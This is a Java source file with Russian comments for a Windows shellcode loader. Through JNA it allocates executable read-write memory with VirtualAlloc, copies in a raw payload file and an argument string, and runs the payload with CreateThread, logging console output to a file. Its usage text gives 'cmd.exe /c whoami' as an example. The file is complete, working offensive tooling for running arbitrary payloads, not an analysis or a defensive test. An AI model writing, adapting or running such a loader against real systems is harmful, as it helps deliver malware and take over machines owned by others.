import com.sun.jna.*;
import java.nio.file.*;
import java.nio.charset.StandardCharsets;
import java.io.*;

public class ShellcodeRunner {

    public interface Kernel32 extends Library {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);

        Pointer VirtualAlloc(Pointer lpAddress, int dwSize, int flAllocationType, int flProtect);
        Pointer CreateThread(Pointer lpThreadAttributes, int dwStackSize, Pointer lpStartAddress, Pointer lpParameter, int dwCreationFlags, Pointer lpThreadId);
        int WaitForSingleObject(Pointer hHandle, int dwMilliseconds);

        int MEM_COMMIT = 0x1000;
        int MEM_RESERVE = 0x2000;
        int PAGE_EXECUTE_READWRITE = 0x40;
        int INFINITE = 0xFFFFFFFF;
    }

    public static void main(String[] args) throws Exception {
        // Проверка аргументов
        if (args.length < 2) {
            System.out.println("Usage: java ShellcodeRunner <payload.bin> <flags>");
            System.out.println("Example: java ShellcodeRunner payload.bin \"cmd.exe /c whoami\"");
            return;
        }

        String payloadPath = args[0];
        StringBuilder flagsBuilder = new StringBuilder();
        for (int i = 1; i < args.length; i++) {
            flagsBuilder.append(args[i]).append(" ");
        }
        String flags = flagsBuilder.toString().trim();

        // Логирование в файл + вывод в терминал
        FileOutputStream logFile = new FileOutputStream("shellcode_log.txt", true);
        TeeOutputStream teeOut = new TeeOutputStream(System.out, logFile);
        TeeOutputStream teeErr = new TeeOutputStream(System.err, logFile);
        PrintStream dualOut = new PrintStream(teeOut, true);
        PrintStream dualErr = new PrintStream(teeErr, true);
        System.setOut(dualOut);
        System.setErr(dualErr);

        System.out.println("[*] Loading shellcode from: " + payloadPath);
        System.out.println("[*] Flags: " + flags);

        // Загрузка shellcode и флагов
        byte[] shellcode = Files.readAllBytes(Paths.get(payloadPath));
        byte[] flagBytes = (flags + "\0").getBytes(StandardCharsets.UTF_8);
        int totalSize = shellcode.length + flagBytes.length;

        Pointer memory = Kernel32.INSTANCE.VirtualAlloc(
                Pointer.NULL,
                totalSize,
                Kernel32.MEM_COMMIT | Kernel32.MEM_RESERVE,
                Kernel32.PAGE_EXECUTE_READWRITE
        );

        if (memory == null) {
            System.err.println("[-] VirtualAlloc failed");
            return;
        }

        memory.write(0, shellcode, 0, shellcode.length);
        long flagOffset = shellcode.length;
        memory.write(flagOffset, flagBytes, 0, flagBytes.length);

        Pointer flagPointer = memory.share(flagOffset);

        System.out.println("[*] Executing shellcode...");

        Pointer thread = Kernel32.INSTANCE.CreateThread(
                Pointer.NULL, 0, memory, flagPointer, 0, Pointer.NULL
        );

        if (thread == null) {
            System.err.println("[-] CreateThread failed");
            return;
        }

        Kernel32.INSTANCE.WaitForSingleObject(thread, Kernel32.INFINITE);

        System.out.println("[+] Shellcode finished execution");

        // Завершаем и закрываем логи
        dualOut.flush();
        dualErr.flush();
        logFile.flush();
        dualOut.close();
        dualErr.close();
        logFile.close();
    }

    // Класс для TeeOutputStream (дублирование вывода)
    public static class TeeOutputStream extends OutputStream {
        private final OutputStream stream1;
        private final OutputStream stream2;

        public TeeOutputStream(OutputStream s1, OutputStream s2) {
            this.stream1 = s1;
            this.stream2 = s2;
        }

        @Override
        public void write(int b) throws IOException {
            stream1.write(b);
            stream2.write(b);
        }

        @Override
        public void write(byte[] b, int off, int len) throws IOException {
            stream1.write(b, off, len);
            stream2.write(b, off, len);
        }

        @Override
        public void flush() throws IOException {
            stream1.flush();
            stream2.flush();
        }

        @Override
        public void close() throws IOException {
            stream1.close();
            stream2.close();
        }
    }
}
